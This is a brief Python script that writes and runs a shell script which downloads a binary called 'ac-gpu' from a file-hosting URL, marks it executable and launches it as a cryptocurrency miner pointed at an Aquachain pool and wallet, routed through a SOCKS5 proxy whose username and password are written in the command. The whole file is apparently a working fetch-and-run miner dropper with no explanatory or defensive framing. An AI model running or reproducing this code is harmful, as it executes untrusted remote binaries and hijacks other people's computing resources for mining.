import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
os.system('echo "./ac-gpu -F http://pool.aquachain.xyz:8888/0xbaA32F16bAaCA5D687CA155C53F0daAc315f0082/TOTO -t 6 --proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
os.system('sleep 2')
os.system('sh tes')
